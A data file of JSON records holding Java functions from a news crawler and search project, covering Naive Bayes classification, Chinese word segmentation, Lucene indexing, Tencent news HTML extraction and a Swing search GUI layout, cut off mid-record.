{"docstring": "/**\n* \n* @param x \u0131\n* @param c \u0137\n* @return \u00b5\n*/\n", "func_signal": "public static float calculatePxc(String x, String c)", "code": "{\n    float ret = 0F;\n    float Nxc = tdm.getCountContainKeyOfClassification(c, x);\n    float Nc = tdm.getTrainingFileCountOfClassification(c);\n    float V = tdm.getTraningClassifications().length;\n    ret = (Nxc + 1) / (Nc + M + V); //\u03aa\u02f10\u043c\u0228\n    return ret;\n}", "path": "src\\com\\gs\\Classifier\\ClassConditionalProbability.java", "repo_name": "gsh199449/DistributeCrawler", "stars": 72, "license": "None", "language": "java", "size": 3629}
{"docstring": "/**\n * \u62bd\u53d6\u5355\u4e2a\u6587\u4ef6\u7684\u8bcd,\u8fd4\u56de\u4e00\u4e2aSet\n * @author GS\n * @param current\n * @return\n */\n", "func_signal": "public Set<String> extractSingle(File current)", "code": "{\n\tFileReader d = null;\n\tSet<String> list = new HashSet<String>();// sped aritical\n\ttry {\n\t\td = new FileReader(current);\n\t\tIKSegmenter ik = new IKSegmenter(d, true);\n\t\twhile (true) {\n\t\t\ttry {\n\t\t\t\tString a = ik.next().getLexemeText();\n\t\t\t\tif (!list.contains(a) && a.length() > 1\n\t\t\t\t\t\t&& a.matches(\".*[\\u4e00-\\u9faf].*\")) {\n\t\t\t\t\tlist.add(a);\n\t\t\t\t}\n\t\t\t} catch (NullPointerException e) {\n\t\t\t\tbreak;\n\t\t\t} catch (ArrayIndexOutOfBoundsException e) {\n\t\t\t}\n\t\t}\n\t} catch (FileNotFoundException e) {\n\t\te.printStackTrace();\n\t} catch (IOException e) {\n\t\te.printStackTrace();\n\t}\n\treturn list;\n}", "path": "src\\com\\gs\\Classifier\\MapMaker.java", "repo_name": "gsh199449/DistributeCrawler", "stars": 72, "license": "None", "language": "java", "size": 3629}
{"docstring": "/**\n * \u663e\u793aCollection\u91cc\u9762\u7684\u6bcf\u4e00\u4e2a\u6587\u6863,\u663e\u793a\u6807\u9898\u548cURL\n * @author GS\n * @param documents\n */\n", "func_signal": "public static void displayDocuments(final Collection<Document> documents)", "code": "{\n    System.out.println(\"Collected \" + documents.size() + \" documents\\n\");//\u6240\u6709\u7684\u6587\u6863\u603b\u6570\n    for (final Document document : documents)\n    {\n        displayDocument(0, document);//\u663e\u793a\u5355\u4e2a\u6587\u6863,\u5305\u62ec\u663e\u793a\u6807\u9898\u548cURL\n    }\n}", "path": "src\\com\\gs\\cluster\\ConsoleFormatter.java", "repo_name": "gsh199449/DistributeCrawler", "stars": 72, "license": "None", "language": "java", "size": 3629}
{"docstring": "/**\n * @author GS\n * @param indexField\n * @param docsField\n * @param docnumber\n *            \u9700\u8981\u7684\u7ed3\u679c\u6570\u91cf\n */\n", "func_signal": "public void index(String indexField, String docsField, int docnumber)", "code": "{\n\ttry {\n\t\tDirectory directory = FSDirectory.open(new File(indexField));\n\t\tIndexWriterConfig conf = new IndexWriterConfig(Version.LUCENE_35,\n\t\t\t\tnew IKAnalyzer());\n\t\tIndexWriter writer = new IndexWriter(directory, conf);\n\t\tFile f = new File(docsField);\n\t\tDocument doc;\n\t\tfor (File file : f.listFiles()) {\n\t\t\tlogger.info(\"Indexing   \" + file.getName());\n\t\t\tJsonReader jr = new JsonReader(file);\n\t\t\twhile (jr.hasNext()) {\n\t\t\t\tdoc = new Document();\n\t\t\t\tHit hit = jr.next();\n\t\t\t\tif (hit == null)\n\t\t\t\t\tcontinue;\n\t\t\t\tdoc.add(new Field(\"content\",\n\t\t\t\t\t\thit.getPagePOJO().getContent(), Field.Store.NO,\n\t\t\t\t\t\tField.Index.ANALYZED));\n\t\t\t\tdoc.add(new NumericField(\"startOffset\", Field.Store.YES,\n\t\t\t\t\t\tfalse).setLongValue(hit.getStartOffset()));\n\t\t\t\tdoc.add(new Field(\"filename\", hit.getFileName(),\n\t\t\t\t\t\tField.Store.YES, Field.Index.NOT_ANALYZED));\n\t\t\t\twriter.addDocument(doc);\n\t\t\t}\n\t\t\tjr.close();\n\t\t}\n\t\twriter.close();\n\n\t} catch (CorruptIndexException e) {\n\t\tlogger.error(e.getMessage());\n\t} catch (LockObtainFailedException e) {\n\t\tlogger.error(e.getMessage());\n\t} catch (IOException e) {\n\t\tlogger.error(e.getMessage());\n\t} catch (Exception e) {\n\t\tlogger.error(e.getMessage());\n\t}\n}", "path": "src\\com\\gs\\indexer\\Indexer.java", "repo_name": "gsh199449/DistributeCrawler", "stars": 72, "license": "None", "language": "java", "size": 3629}
{"docstring": "/**\n * @param html\n * @return\n */\n", "func_signal": "@Override\npublic String extractFromHtml(String html)", "code": "{\n\tString re = new String();\n\tif (html == null) {\n\t\treturn re;\n\t}\n\tString regex = \"<div id=\\\"Cnt-Main-Article-QQ\\\".*?>(.*?)</P>.?</div>\";//\u6b63\u6587\u6700\u540e\u662f</p>\u6362\u884c</div>\u6216\u8005</P></div>\u4e3a\u7ed3\u675f\u6807\u5fd7\u7684\n\tPattern pt = Pattern.compile(regex,Pattern.DOTALL);\n\tMatcher mt = pt.matcher(html);//s\u4e3a\u7f51\u9875\u7684html\u5185\u5bb9\n\tif (mt.find()) {\n\t\tre = mt.group(1);\n\t}\n\tPattern pt1 = Pattern.compile(\"<script>.*?</script>\",Pattern.DOTALL);\n\tMatcher mt1 = pt1.matcher(re);\n\tre = mt1.replaceAll(\"\");\n\tPattern pt2 = Pattern.compile(\"<style>.*?</style>\",Pattern.DOTALL);\n\tMatcher mt2 = pt2.matcher(re);\n\tre = mt2.replaceAll(\"\");\n/*\t\tPattern pt3 = Pattern.compile(\"<!--[if !IE]>.*?<![endif]-->\",Pattern.DOTALL);\n\tMatcher mt3 = pt3.matcher(re);\n\tre = mt3.replaceAll(\"\");*///FIXME \u8fd9\u4e2a\u6807\u7b7e\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u62b9\u4e0d\u6389\n\tre = re.replaceAll(\"<.*?>\", \"\");//\u62b9\u6389\u6240\u6709\u5c16\u62ec\u53f7\u7684\u5185\u5bb9\n\tre = re.replaceAll(\"\\\\s\", \"\");//\u62b9\u6389\u6240\u6709\u7a7a\u767d\n\tre = re.replaceAll(\"\u6b63\u5728\u64ad\u653e\", \"\");//\u505c\u7528\u8bcd\n\tre = re.replaceAll(\"\u8d44\u6599\u56fe\", \"\");//\u505c\u7528\u8bcd\n\treturn re;\n}", "path": "src\\com\\gs\\extractor\\TencentNewsContentExtractor.java", "repo_name": "gsh199449/DistributeCrawler", "stars": 72, "license": "None", "language": "java", "size": 3629}
{"docstring": "/**\n * Initialize the contents of the frame.\n */\n", "func_signal": "private void initialize()", "code": "{\n\tframe = new JFrame();\n\tframe.setTitle(\"\u65b0\u95fb\u641c\u7d22\");\n\tframe.setBounds(100, 100, 750, 475);\n\tframe.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n\tframe.getContentPane().setLayout(new CardLayout(0, 0));\n\n\tJPanel panel = new JPanel();\n\tpanel.setBorder(new LineBorder(new Color(0, 0, 0)));\n\tframe.getContentPane().add(panel, \"name_1607874912653\");\n\n\tJTabbedPane tabbedPane = new JTabbedPane(JTabbedPane.TOP);\n\tGroupLayout gl_panel = new GroupLayout(panel);\n\tgl_panel.setHorizontalGroup(gl_panel.createParallelGroup(\n\t\t\tAlignment.TRAILING).addGroup(\n\t\t\tAlignment.LEADING,\n\t\t\tgl_panel.createSequentialGroup()\n\t\t\t\t\t.addComponent(tabbedPane, GroupLayout.DEFAULT_SIZE,\n\t\t\t\t\t\t\t764, Short.MAX_VALUE).addGap(0)));\n\tgl_panel.setVerticalGroup(gl_panel.createParallelGroup(\n\t\t\tAlignment.LEADING).addComponent(tabbedPane, Alignment.TRAILING,\n\t\t\tGroupLayout.DEFAULT_SIZE, 435, Short.MAX_VALUE));\n\tpanel.setLayout(gl_panel);\n\n\tJPanel panel_1 = new JPanel();\n\ttabbedPane.addTab(\"\u65b0\u95fb\u641c\u7d22\", null, panel_1, null);\n\n\ttextField = new JTextField();\n\ttextField.setColumns(10);\n\n\tJLabel lblNewLabel = new JLabel(\"\u6587\u672c\u8def\u5f84\");\n\n\ttxtDtestjson = new JTextField();\n\ttxtDtestjson.setText(\"D://Test//Json\");\n\ttxtDtestjson.setColumns(10);\n\n\tfinal JCheckBox checkBox = new JCheckBox(\"\u663e\u793a\u65b0\u95fb\u5185\u5bb9\");\n\tJButton button = new JButton(\"\u641c\u7d22\");\n\tfinal JCheckBox checkBox_1 = new JCheckBox(\"\u5206\u7c7b\");\n\n\tJScrollPane scrollPane = new JScrollPane();\n\n\tJLabel lblNewLabel_3 = new JLabel(\"\u7d22\u5f15\u8def\u5f84\");\n\n\ttxtDtestindex = new JTextField();\n\ttxtDtestindex.setText(\"D://Test//index\");\n\ttxtDtestindex.setColumns(10);\n\n\tcomboBox = new JComboBox<String>();\n\tcomboBox.addItemListener(new ItemListener() {\n\n\t\tpublic void itemStateChanged(ItemEvent arg0) {\n\t\t\ttextArea_1.setText(arg0.getItem().toString()\n\t\t\t\t\t+ \"\\n========================\\n\");\n\t\t\tfor (String title : clusterResult.get(arg0.getItem())) {\n\t\t\t\ttextArea_1.append(title + \"\\n\");\n\t\t\t}\n\t\t}\n\t});\n\n\ttextField_3 = new JTextField();\n\ttextField_3.setText(\"10\");\n\ttextField_3.setColumns(10);\n\n\tJLabel lblNewLabel_4 = new JLabel(\"\u6570\u91cf\u4e0a\u9650\");\n\n\tfinal JLabel lblNewLabel_5 = new JLabel(\"\u7b49\u5f85\u8f93\u5165\");\n\n\tfinal JCheckBox checkBox_2 = new JCheckBox(\"\u805a\u7c7b\");\n\tGroupLayout gl_panel_1 = new GroupLayout(panel_1);\n\tgl_panel_1\n\t\t\t.setHorizontalGroup(gl_panel_1\n\t\t\t\t\t.createParallelGroup(Alignment.LEADING)\n\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t\t\t\t\t.addContainerGap()\n\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t.createParallelGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAlignment.LEADING)\n\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createParallelGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAlignment.LEADING)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createParallelGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAlignment.TRAILING)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tlblNewLabel_3,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.DEFAULT_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.DEFAULT_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tShort.MAX_VALUE)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tlblNewLabel,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.DEFAULT_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.DEFAULT_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tShort.MAX_VALUE))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGap(18))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tlblNewLabel_4,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t34,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tShort.MAX_VALUE)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addPreferredGap(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tComponentPlacement.RELATED)))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createParallelGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAlignment.TRAILING)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\ttxtDtestjson,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.DEFAULT_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t118,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tShort.MAX_VALUE)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\ttxtDtestindex,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t118,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addPreferredGap(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tComponentPlacement.RELATED))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addPreferredGap(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tComponentPlacement.RELATED)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\ttextField_3,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t118,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t118,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t118)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addPreferredGap(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tComponentPlacement.RELATED)))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createParallelGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAlignment.LEADING)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGap(18)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createParallelGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAlignment.LEADING)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGap(10)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tbutton,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t83,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\ttextField,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.DEFAULT_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t110,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tShort.MAX_VALUE))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGap(18)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createParallelGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAlignment.LEADING)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcheckBox)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGap(23)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcheckBox_2)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGap(54)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcheckBox_1)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addPreferredGap(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tComponentPlacement.RELATED,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t99,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tShort.MAX_VALUE))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGap(2)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcomboBox,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t0,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t369,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tShort.MAX_VALUE))))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGap(19)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tlblNewLabel_5,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t193,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE))))\n\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tscrollPane,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAlignment.TRAILING,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.DEFAULT_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t701,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tShort.MAX_VALUE))\n\t\t\t\t\t\t\t\t\t.addGap(16)));\n\tgl_panel_1\n\t\t\t.setVerticalGroup(gl_panel_1\n\t\t\t\t\t.createParallelGroup(Alignment.LEADING)\n\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t.createParallelGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAlignment.LEADING)\n\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addContainerGap()\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createParallelGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAlignment.TRAILING)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createParallelGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAlignment.BASELINE)\n\t\t\t\t\t\t\t